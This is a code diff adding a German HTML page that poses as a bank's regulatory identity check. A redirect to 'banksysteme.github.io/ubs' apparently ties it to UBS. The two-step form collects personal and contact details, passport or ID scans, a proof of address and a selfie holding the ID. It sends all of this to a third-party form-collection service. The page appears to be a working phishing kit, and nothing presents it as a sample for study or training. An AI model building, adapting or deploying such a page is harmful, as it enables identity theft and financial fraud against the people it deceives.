@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>identverfahrensysteme</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f6f6f6;
+      padding: 30px;
+      margin: 0;
+    }
+    .form-container {
+      background-color: #fff;
+      max-width: 600px;
+      margin: auto;
+      padding: 35px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 25px;
+      max-width: 230px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 30px;
+      color: #fff;
+      font-size: 22px;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 6px;
+      font-weight: 400;
+      color: #000;
+      font-size: 14px;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 11px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      font-size: 15px;
+      color: #000;
+    }
+    .name-fields {
+      display: flex;
+      gap: 15px;
+      flex-wrap: wrap;
+    }
+    .name-fields div {
+      flex: 1;
+    }
+    button {
+      margin-top: 30px;
+      width: 100%;
+      padding: 14px;
+      background-color: #ef2c30;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #7a0810;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #333;
+      margin-top: 50px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .footer hr {
+      margin: 30px auto 15px;
+      border: none;
+      height: 1px;
+      background-color: #ddd;
+    }
+    .step {
+      display: none;
+    }
+    .step.active {
+      display: block;
+    }
+    @media (max-width: 600px) {
+      .name-fields {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <form 
+      action="https://formcarry.com/s/TFCijrok-r0" 
+      method="POST" 
+      enctype="multipart/form-data" 
+      data-formcarry-redirect="https://banksysteme.github.io/ubs/thanks.html">
+      <input type="hidden" name="_subject" value="Neue KYC-Freischaltung über">
+
+      <!-- Step 1 -->
+      <div class="step active" id="step1">
+         <div style="text-align: center; font-size: 17px; max-width: 800px; margin: 0 auto;"><p><strong>Willkommen!</p>Ihre Identität wird nun gemäß den regulatorischen Vorgaben überprüft.</strong></div>
+        <hr style="width: 100%; height: 0.5px; background-color: #ef2c30; border: none; margin: 10px auto;" />
+        <div style="text-align: center; font-size: 15px; font-weight: bold; margin-bottom: 10px;">
+          Schritt 1: Persönliche Angaben
+        </div>
+        <div style="text-align: center; font-size: 14px; max-width: 800px; margin: 0 auto;">
+          Bitte füllen Sie Ihre Kontaktdaten vollständig aus, um die gesetzlich vorgeschriebene Identitätsprüfung durchzuführen.
+        </div>  
+        <label>Vor- und Nachname</label>
+        <div class="name-fields">
+          <div>
+            <input type="text" name="vorname" placeholder="Vorname" required>
+          </div>
+          <div>
+            <input type="text" name="nachname" placeholder="Nachname" required>
+          </div>
+        </div>
+
+        <div class="name-fields">
+          <div style="flex: 1;">
+            <label for="email">E-Mail-Adresse</label>
+            <input type="email" name="email" id="email" required>
+          </div>
+          <div style="flex: 1;">
+            <label for="phone">Telefonnummer</label>
+            <input type="tel" name="phone" id="phone" required>
+          </div>
+        </div>
+
+        <label for="street">Straße und Hausnummer</label>
+        <input type="text" name="street" id="street" required>
+
+        <div class="name-fields">
+          <div>
+            <label for="zip">Postleitzahl</label>
+            <input type="text" name="zip" id="zip" required>
+          </div>
+          <div>
+            <label for="city">Stadt</label>
+            <input type="text" name="city" id="city" required>
+          </div>
+        </div>
+
+        <label for="country">Land</label>
+        <select name="country" id="country" required>
+          <option value="">Bitte wählen</option>
+          <option value="Schweiz">Schweiz</option>
+          <option value="Deutschland">Deutschland</option>
+          <option value="Österreich">Österreich</option>
+          <option value="Liechtenstein">Liechtenstein</option>
+          <option value="Luxemburg">Luxemburg</option>
+          <option value="Spanien">Spanien</option>
+          <option value="Italien">Italien</option>
+          <option value="Niederlande">Niederlande</option>
+          <option value="Norwegen">Norwegen</option>
+          <option value="Schweden">Schweden</option>
+        </select>
+
+        <button type="button" onclick="nextStep()">Weiter</button>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="step" id="step2">
+        <div style="text-align: center; font-size: 15px; font-weight: bold; margin-bottom: 10px;">
+          Schritt 2: Dokumenten-Upload zur Verifizierung
+        </div>
+        <div style="text-align: center; font-size: 13px; max-width: 800px; margin: 0 auto;">
+          Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder- und Rückseite). Zusätzlich ist ein aktueller Adressnachweis erforderlich (z. B. eine Rechnung oder ein Kontoauszug).
+        </div>  
+        <hr style="width: 100%; height: 0.5px; background-color: #ef2c30; border: none; margin: 10px auto;" />
+        <label for="id_type"><strong>Art des Ausweisdokuments</strong></label>
+        <div style="text-align: left; font-size: 12px;">
+          Wählen Sie bitte aus, welches Ausweisdokument Sie verwenden möchten (z. B. Reisepass oder Personalausweis).
+          Laden Sie anschließend gut lesbare Farbkopien der Vorder- und Rückseite hoch.
+          Alle Angaben (Name, Ausweisnummer, Gültigkeit usw.) müssen vollständig sichtbar und lesbar sein.
+        </div><br>
+        <select name="id_type" id="id_type" required>
+          <option value="">Bitte wählen</option>
+          <option value="Reisepass">Reisepass</option>
+          <option value="Führerschein">Führerschein</option>
+          <option value="Personalausweis">Personalausweis</option>
+        </select>
+
+        <label for="id_front">Vorderseite (PDF/Bild)</label>
+        <input type="file" name="id_front" id="id_front" accept=".pdf,image/*" required>
+
+        <div id="id_back_group">
+          <label for="id_back">Rückseite (PDF/Bild)</label>
+          <input type="file" name="id_back" id="id_back" accept=".pdf,image/*" required>
+        </div>
+
+        <label for="proof_of_address"><strong>Adressnachweis</strong></label>
+        <div style="text-align: left; font-size: 12px;">
+          Bitte laden Sie zusätzlich einen aktuellen Adressnachweis hoch – zum Beispiel eine Stromrechnung, einen Kontoauszug oder eine Meldebescheinigung.
+          Das Dokument darf nicht älter als 3 Monate sein und muss Ihre vollständige Adresse enthalten.
+          Auch hier gilt: Achten Sie auf gute Bildqualität, Lesbarkeit und vollständige Darstellung.
+        </div><br>
+        <input type="file" name="proof_of_address" id="proof_of_address" accept=".pdf,image/*" required>
+
+        <label for="selfie"><strong>Selfie mit Ausweis</strong></label>
+        <div style="text-align: left; font-size: 12px;">
+          Bitte laden Sie ein Selfie hoch, auf dem Sie Ihren Ausweis gut sichtbar in der Hand halten.
+          Achten Sie auf gute Ausleuchtung, damit Ihr Gesicht und das Dokument klar erkennbar sind.
+        </div><br>
+        <input type="file" name="selfie" id="selfie" accept="image/*" required>
+
+        <div class="name-fields">
+          <button type="button" onclick="prevStep()">Zurück</button>
+          <button type="submit">Absenden</button>
+        </div>
+      </div>
+    </form>
+  </div>
+
+  <br><br>
+  <div style="font-size: 13px; text-align: center; line-height: 1.6; max-width: 600px; margin: 0 auto;">
+    <p>Bei Rückfragen erreichen Sie uns unter:</p>
+    📞 Telefon: +41 44 707 72 03 (Mo–Fr, 9–17 Uhr)<br><br>
+  </div>
+
+  <div class="footer">
+    <hr>
+  </div>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <script>
+    function nextStep() {
+      document.getElementById('step1').classList.remove('active');
+      document.getElementById('step2').classList.add('active');
+    }
+    function prevStep() {
+      document.getElementById('step2').classList.remove('active');
+      document.getElementById('step1').classList.add('active');
+    }
+
+    const idTypeSelect = document.getElementById('id_type');
+    const idBackGroup = document.getElementById('id_back_group');
+    const idBackInput = document.getElementById('id_back');
+
+    function updateUploadFields() {
+      const selected = idTypeSelect.value;
+      if (selected === 'Reisepass') {
+        idBackGroup.style.display = 'none';
+        idBackInput.required = false;
+      } else {
+        idBackGroup.style.display = 'block';
+        idBackInput.required = true;
+      }
+    }
+
+    updateUploadFields();
+    idTypeSelect.addEventListener('change', updateUploadFields);
+  </script>
+</body>
+</html>
